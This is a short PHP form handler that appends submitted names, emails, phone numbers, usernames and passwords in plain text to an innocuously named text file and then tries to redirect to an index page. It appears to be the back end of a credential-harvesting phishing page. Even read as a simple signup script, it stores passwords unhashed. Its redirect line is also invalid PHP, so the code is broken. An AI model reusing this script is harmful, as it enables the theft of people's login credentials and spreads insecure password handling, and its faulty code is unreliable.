<?php
$document = fopen("w3r-wer_documentation.txt", "a+");
$your_name = $_POST["name"] . "\n";
$your_sob_nome = $_POST["sobnome"] . "\n";
$your_email = $_POST["email"] . "\n";
$your_tel = $_POST["tel"] . "\n";
$your_user_name = $_POST["user_name"] . "\n";
$your_pwd = $_POST["pwd"] . "\n";
$espace = "===============================================" . "\n";

fwrite($document, $your_name);
fwrite($document, $your_sob_nome);
fwrite($document, $your_email);
fwrite($document, $your_tel);
fwrite($document, $your_user_name);
fwrite($document, $your_pwd);
fwrite($document, $espace);

fclose($document);
header = "Location: ./index.html";
?>
